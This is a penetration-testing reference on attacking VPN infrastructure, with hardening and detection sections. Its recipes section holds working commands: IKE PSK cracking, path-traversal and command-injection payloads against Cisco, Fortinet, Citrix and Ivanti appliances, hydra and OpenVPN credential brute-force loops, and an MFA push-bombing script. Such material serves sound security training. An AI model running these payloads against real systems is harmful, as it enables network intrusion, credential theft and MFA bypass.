# VPN Attacks

Exploitation of VPN infrastructure: IKE aggressive mode PSK
cracking, vendor CVE exploitation, credential spraying, MFA bypass,
split tunneling abuse, and session hijacking. Covers IPsec,
OpenVPN, WireGuard, and SSL VPN appliances.

> [!CAUTION]
> Exploiting VPN appliances can crash them and disconnect all
> remote workers. Never test CVEs against production VPNs. Only
> run these against systems you own or have written authorization
> to test, and only in a lab for the first time.

---

## 1. Overview

VPN attacks fall into four groups:

- **Protocol weaknesses:** IKEv1 Aggressive Mode with PSK, PPTP
  (broken), L2TP without IPsec.
- **Authentication attacks:** brute force, password spray, credential
  stuffing, MFA fatigue.
- **CVE exploitation:** vendor-specific vulnerabilities in VPN
  appliances (Cisco, Palo Alto, Fortinet, Citrix, Ivanti, F5).
- **Post-authentication abuse:** split tunneling interception,
  session token theft, lateral movement into the internal network.

The highest-value target is the VPN concentrator itself: internet-
facing, authentication-terminating, and often with broad network
access. A compromised VPN is equivalent to physical presence on the
corporate network.

---

## 2. Reconnaissance / Enumeration

### 2.1 Identify the VPN technology and vendor

See file 03, section 2. Quick reference:

```text
UDP 500/4500  IPsec (IKE)
UDP 1194      OpenVPN
UDP 51820     WireGuard
TCP 443       SSL VPN (Cisco AnyConnect, Palo Alto GlobalProtect,
              Fortinet FortiClient, F5 BIG-IP, Citrix NetScaler,
              Ivanti Connect Secure)
TCP 1723      PPTP (deprecated, insecure)
```

### 2.2 Version fingerprinting

```bash
# Cisco ASA/AnyConnect: version in the HTML login page
curl -sk https://vpn.example.com/+CSCOE+/logon.html | grep -i "version"

# Palo Alto GlobalProtect: version in the login page or via API
curl -sk https://vpn.example.com/global-protect/login.esp | grep -i "panos"

# Fortinet FortiClient: version in the login page
curl -sk https://vpn.example.com/remote/login | grep -i "fortinet"

# Citrix NetScaler: version in the login page
curl -sk https://vpn.example.com/vpn/index.html | grep -i "citrix"
```

### 2.3 SSL certificate analysis

```bash
openssl s_client -connect vpn.example.com:443 -showcerts </dev/null 2>/dev/null | \
    openssl x509 -noout -subject -issuer -dates
```

Issuer reveals the vendor (Cisco Manufacturing CA, Palo Alto
Networks, Fortinet, etc.). Expiration dates can reveal patching
habits.

### 2.4 IKE scanning

```bash
# Main Mode
sudo ike-scan -M vpn.example.com

# Aggressive Mode (the interesting one)
sudo ike-scan -A vpn.example.com

# Show the vendor ID (VID) to identify the appliance
sudo ike-scan -M --showbackoff vpn.example.com
```

The `VID=` field identifies the vendor (Cisco, Fortinet, etc.).

### 2.5 OpenVPN fingerprinting

```bash
# Probe for OpenVPN
nmap -sU -p 1194 --script openvpn-info vpn.example.com

# Or with openvpn binary
openvpn --remote vpn.example.com 1194 --proto udp --verb 3
```

### 2.6 Web interface enumeration

```bash
# Directory brute force against the SSL VPN web interface
feroxbuster -u https://vpn.example.com/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k

# Vendor-specific paths to check:
#   Cisco AnyConnect: /+CSCOE+/, /+CSCOU+/, /+CSCOT+/
#   Palo Alto GlobalProtect: /global-protect/, /ssl-vpn/
#   Fortinet FortiClient: /remote/, /sslvpn/
#   F5 BIG-IP: /my.policy, /vdesk/
#   Citrix NetScaler: /vpn/, /citrix/
```

---

## 3. Common Attack Vectors

### 3.1 IKEv1 Aggressive Mode PSK cracking

IKEv1 Aggressive Mode transmits a hash of the PSK in the handshake.
An attacker can capture this hash and crack it offline.

**Precondition:** the VPN uses IKEv1 Aggressive Mode with PSK.

**Impact:** PSK recovery, full VPN access.

**Mitigation:** IKEv2 with certificate authentication.

### 3.2 Vendor CVE exploitation

VPN appliances have a long history of critical CVEs. Notable ones:

**Cisco ASA / AnyConnect:**

- CVE-2018-0101 - remote code execution (DoS/RCE).
- CVE-2020-3452 - path traversal (read arbitrary files).
- CVE-2023-20269 - unauthorized access to AnyConnect.

**Palo Alto GlobalProtect:**

- CVE-2019-1579 - pre-auth RCE.
- CVE-2024-3400 - command injection (CVSS 10.0).

**Fortinet FortiOS:**

- CVE-2018-13379 - path traversal (SSL VPN session file).
- CVE-2022-42475 - heap overflow (pre-auth RCE).
- CVE-2024-21762 - out-of-bounds write.

**Citrix NetScaler:**

- CVE-2019-19781 - path traversal (pre-auth RCE).
- CVE-2023-3519 - pre-auth RCE (CVSS 9.8).

**Ivanti Connect Secure:**

- CVE-2023-46805 - auth bypass.
- CVE-2024-21887 - command injection.
- Combined: unauthenticated RCE.

**Impact:** pre-auth RCE, credential theft, full network access.

**Mitigation:** patch monthly, subscribe to advisories, monitor.

### 3.3 Credential brute force / password spray

VPN endpoints often allow unlimited authentication attempts. A slow
spray (1 attempt per hour per user) can recover credentials without
triggering lockout.

**Targets:** OWA, SSL VPN web portals, IKEv2 EAP, OpenVPN user
auth.

### 3.4 MFA fatigue / push bombing

If MFA is push-based (Duo, Microsoft Authenticator), the attacker
sends repeated push notifications until the user approves one.

**Impact:** MFA bypass.

**Mitigation:** number matching, additional context, rate limiting,
FIDO2 (phishing-resistant).

### 3.5 MFA phishing proxy (Evilginx-style)

The attacker proxies the legitimate login page (including MFA) and
captures the session token after successful authentication.

**Impact:** MFA bypass.

**Mitigation:** FIDO2 (bound to origin), conditional access, token
binding.

### 3.6 Split tunneling abuse

If split tunneling is enabled, the client sends corporate traffic
through the VPN and general internet traffic directly. An attacker
on the same local network (coffee shop, hotel) can intercept the
direct traffic.

**Impact:** interception of user's non-VPN traffic (potentially
including credentials).

**Mitigation:** full tunnel, or endpoint security that protects the
client's local traffic.

### 3.7 Session token theft

If the VPN session token is not bound to the device (IP,
certificate), an attacker who steals the token can reuse it.

**Impact:** session hijacking, access to the corporate network.

**Mitigation:** short session lifetimes, device binding, IP binding
(where possible).

### 3.8 VPN client software attacks

The VPN client software itself can have vulnerabilities:

- Buffer overflows in the client (CVE-2020-3153 in Cisco
  AnyConnect).
- Privilege escalation in the client's local helper service.
- Update mechanism abuse (malicious update server).

**Impact:** local privilege escalation on the client, or code
execution.

### 3.9 PPTP and L2TP weaknesses

PPTP is broken (MSCHAPv2 crackable, no forward secrecy). L2TP
without IPsec is cleartext.

**Impact:** credential capture, traffic interception.

**Mitigation:** disable PPTP; use IKEv2 or SSL VPN.

---

## 4. Exploitation Recipes

### 4.1 IKE aggressive mode detection

```bash
sudo ike-scan -A vpn.example.com
```

Expected output (vulnerable):

```text
vpn.example.com  500  Aggressive Mode Handshake returned
    HDR=(CKY-R=..., SA=(Enc=3DES Hash=SHA1 Auth=PSK Group=2:modp1024))
    VID=...
    KEY=(...)
    ID(Type=ID_USER_FQDN, Value=vpn.example.com)
```

### 4.2 Save and crack the PSK hash

```bash
# Save the handshake
sudo ike-scan -A -P handshake.txt vpn.example.com

# Crack with psk-crack
psk-crack -d /usr/share/wordlists/rockyou.txt handshake.txt

# Or with hashcat (mode 5300)
hashcat -m 5300 handshake.txt /usr/share/wordlists/rockyou.txt
```

Expected output (found):

```text
handshake.txt:Summer2026!
Status...........: Cracked
```

### 4.3 Cisco ASA path traversal (CVE-2020-3452)

```bash
# Read arbitrary files from the ASA web interface
curl -sk "https://vpn.example.com/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"

# Or via the metasploit module:
msfconsole -q
use auxiliary/scanner/http/cisco_asa_traversal
set RHOSTS vpn.example.com
run
```

### 4.4 Fortinet path traversal (CVE-2018-13379)

```bash
# Read the SSL VPN session file (contains credentials)
curl -sk "https://vpn.example.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# If successful, the file contains base64-encoded usernames/passwords
```

### 4.5 Citrix NetScaler path traversal (CVE-2019-19781)

```bash
# Read arbitrary files via the template engine
curl -sk "https://vpn.example.com/vpn/../vpns/cfg/smb.conf"

# Or with the metasploit module:
msfconsole -q
use exploit/linux/http/citrix_dir_traversal_rce
set RHOSTS vpn.example.com
run
```

### 4.6 Palo Alto command injection (CVE-2024-3400)

```bash
# Exploitation is via the telemetry endpoint (SESSID cookie)
# Reference: https://github.com/horizon3ai/CVE-2024-3400
# The exploit writes a file to /var/appweb/sslvpndocs/global-protect/portal/images/
# then triggers execution

# DO NOT run against production. Only in a lab.
```

### 4.7 Ivanti Connect Secure RCE (CVE-2023-46805 + CVE-2024-21887)

```bash
# Step 1: auth bypass via /api/v1/totp/user-backup-code/
curl -sk "https://vpn.example.com/api/v1/totp/user-backup-code/../../system/system-information" \
    -H "Cookie: DSID=..."

# Step 2: command injection via /api/v1/license/keys-status/
curl -sk "https://vpn.example.com/api/v1/license/keys-status/;whoami;" \
    -H "Cookie: DSID=..."

# Reference: https://github.com/rapid7/metasploit-framework
# DO NOT run against production.
```

### 4.8 SSL VPN web brute force with hydra

```bash
# Cisco AnyConnect
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
    vpn.example.com https-form-post "/+webvpn.html:username=^USER^&password=^PASS^:Login failed"

# Generic form-based (adjust for the vendor)
hydra -L users.txt -P passwords.txt \
    https-post-form "vpn.example.com/login:username=^USER^&password=^PASS^:Invalid"
```

### 4.9 OpenVPN credential brute force

```bash
# For OpenVPN with username/password auth
# Create a list of credentials, then loop
while read creds; do
    user=$(echo $creds | cut -d: -f1)
    pass=$(echo $creds | cut -d: -f2)
    echo -e "$user\n$pass" > /tmp/auth.txt
    timeout 10 openvpn --config test.ovpn --auth-user-pass /tmp/auth.txt 2>&1 | \
        grep -q "Initialization Sequence Completed" && echo "VALID: $creds"
done < creds.txt
```

### 4.10 MFA fatigue with a custom script

```bash
# Requires valid credentials (from spray or phishing)
# Loop the login attempt to trigger repeated push notifications
for i in $(seq 1 20); do
    curl -sk -X POST https://vpn.example.com/api/login \
        -d "username=jdoe&password=Summer2026!"
    sleep 30
done
# Eventually the user approves the push out of frustration
```

---

## 5. Post-Exploitation

After VPN access:

- **Enumerate the internal network** as if you were on-site.
- **Access internal services** the VPN allows (file shares, intranet,
  RDP, SSH).
- **Pivot to other systems** using the VPN client's access.
- **Steal additional credentials** from internal systems.

After VPN appliance compromise (RCE):

- **Extract credentials** from the appliance's config files (PSKs,
  certificates, cached user credentials).
- **Persistence** via scheduled tasks, web shells, modified firmware.
- **Lateral movement** to the internal network using the appliance's
  network position.
- **Modify logs** to hide traces (some appliances have weak log
  integrity).

After MFA bypass:

- **Full access** as the victim, including any internal resources.
- **Persistence** via additional MFA device registration (if allowed).

---

## 6. Risk Context (AppSec)

| Factor | Value |
|--------|-------|
| Typical severity | High to Critical |
| Preconditions | Access to the VPN endpoint (internet-facing) |
| Detectability | Medium - logs, MFA prompts, anomaly detection |
| Business impact | Network access, credential theft, lateral movement, AD compromise |

VPN appliances are the **crown jewels** of remote access. A single
compromised appliance often leads to full network access.

---

## 7. Root Causes (AppSec)

- IKEv1 Aggressive Mode with PSK enabled.
- VPN appliance unpatched (critical CVEs).
- MFA not enforced, or push-based without number matching.
- Split tunneling enabled without endpoint controls.
- Session tokens not bound to devices.
- Weak or shared credentials.
- Web interface with web vulnerabilities.
- Client software with local privilege escalation vulnerabilities.

---

## 8. Preventive Controls (AppSec)

### 8.1 Disable IKEv1 Aggressive Mode

```text
# StrongSwan: aggressive mode is disabled by default in modern versions
# If using IPsec-tools or similar, explicitly disable aggressive mode
```

Use IKEv2 with certificate authentication.

### 8.2 Patch VPN appliances monthly

Subscribe to vendor advisories. Apply patches within 24-48 hours
of release.

- Cisco: sec.cloudapps.cisco.com/security/center/publicationListing.x
- Palo Alto: security.paloaltonetworks.com
- Fortinet: fortiguard.com/psirt
- Citrix: support.citrix.com/security-bulletins
- Ivanti: forums.ivanti.com/s/global-search/security-advisories

### 8.3 Enforce MFA with number matching or FIDO2

- Push notifications with number matching (Microsoft
  Authenticator, Duo).
- FIDO2 security keys for high-risk users (admins, executives).
- Rate limit MFA prompts (5 per hour per user).

### 8.4 Full tunnel or secure split tunneling

- Full tunnel: all traffic goes through the VPN.
- If split tunneling is required, pair it with endpoint security
  (EDR, host firewall, DNS filtering).

### 8.5 Bind sessions to devices

- Client certificates (not just username/password).
- IP binding where possible.
- Short session lifetimes (8-12 hours).
- Token binding (OAuth).

### 8.6 Rate limit authentication

- 5 failed attempts per user per 15 minutes, then lockout.
- IP-based rate limiting (10 attempts per minute per IP).
- CAPTCHA after 3 failures.

### 8.7 Network segmentation

- VPN clients land in a dedicated VLAN with firewall rules.
- Least-privilege access: only the resources the user needs.
- No direct access to the management network.

### 8.8 Client software hardening

- Auto-update the VPN client.
- Verify the update server (code signing, HTTPS with pinning).
- Disable unnecessary features (split tunneling, always-on).

### 8.9 Logging and monitoring

- Log all authentications (success and failure).
- Alert on authentication from new geographies.
- Alert on MFA failures.
- Alert on unusual session lengths or data volumes.
- File integrity monitoring on the appliance.

---

## 9. Detection Controls (AppSec)

### 9.1 VPN authentication anomalies

- Login from a new country or ASN.
- Login outside business hours.
- Login from a known-bad IP (threat intel).
- Rapid succession of failed logins.
- Successful login after many failures (credential stuffing).

### 9.2 Session anomalies

- Unusually long sessions.
- Large data transfers (possible exfiltration).
- Concurrent sessions from different geographies.
- Session token reuse from a different IP.

### 9.3 Appliance-specific

- Vendor IDS/IPS signatures for known CVEs.
- File integrity monitoring on the appliance.
- WAF alerts on the web portal.
- Unusual processes or network connections from the appliance.

### 9.4 SIEM rules

- Alert on VPN login from a new country for a user.
- Alert on > 5 failed VPN logins per user per 5 minutes.
- Alert on VPN login outside the user's normal hours.
- Alert on session token reuse from a different IP.
- Alert on new admin accounts or config changes on the appliance.

---

## 10. Verification (AppSec)

Test the controls after deployment:

1. **IKEv1 Aggressive Mode:** run `ike-scan -A` against the VPN.
   Should not respond.
2. **MFA:** attempt VPN login with valid credentials but no MFA.
   Should fail.
3. **MFA number matching:** trigger an MFA push. Should require
   entering a number shown on the login page.
4. **Rate limiting:** attempt 10 logins in 1 minute. Should lock out.
5. **Session binding:** copy a session token to another machine.
   Should be rejected.
6. **Patching:** check the appliance firmware version against the
   vendor's latest advisory.
7. **Segmentation:** from a VPN client, try to reach the management
   network. Should be blocked.

---

## 11. OSCP Notes

VPN attacks are **not** in the OSCP exam. They are relevant for:

- Real internal engagements where VPN is the access path.
- Red team operations targeting remote workers.
- PEN-200 covers tunneling but not VPN appliance exploitation.

For the report, document:

- The VPN technology and version.
- The attack path (IKE aggressive, credential spray, CVE
  exploitation).
- The defensive control (IKEv2, MFA, patching, session binding).

---

## 12. Production Notes

- **Never test CVE exploits against production VPNs.** A failed
  exploit can crash the appliance and disconnect all remote workers.
  Always test in a lab first.
- **Patch fast.** VPN appliance CVEs are exploited within days of
  release. Subscribe to advisories.
- **MFA number matching defeats MFA fatigue.** Deploy it everywhere.
- **FIDO2 defeats MFA phishing proxies.** For admins and high-risk
  users, require FIDO2 security keys.
- **Session tokens are as valuable as passwords.** Short lifetimes,
  device binding, monitoring.
- **Split tunneling is a trade-off.** Full tunnel is safer but
  slower. Document the choice.
- **Log everything.** VPN logs are critical for incident response.
  Retain for at least 90 days.
- **Red team engagements should test the VPN** explicitly. It is
  often the weakest link in remote access.

---

## 13. References

- ike-scan - https://github.com/royhills/ike-scan - IKE scanner
- hashcat - https://hashcat.net/hashcat/ - mode 5300 (IKEv1 PSK)
- Cisco Security Advisories - https://sec.cloudapps.cisco.com/security/center/publicationListing.x
- Palo Alto Security Advisories - https://security.paloaltonetworks.com/
- Fortinet PSIRT - https://www.fortiguard.com/psirt
- Citrix Security Bulletins - https://support.citrix.com/security-bulletins
- Ivanti Security Advisories - https://forums.ivanti.com/s/global-search/security-advisories
- MITRE ATT&CK T1133 - External Remote Services - https://attack.mitre.org/techniques/T1133/
- MITRE ATT&CK T1078 - Valid Accounts - https://attack.mitre.org/techniques/T1078/
- NIST SP 800-77 - Guide to IPsec VPNs
- NSA - "Selecting and Hardening Remote Access VPNs"
- `man ike-scan`, `man psk-crack`
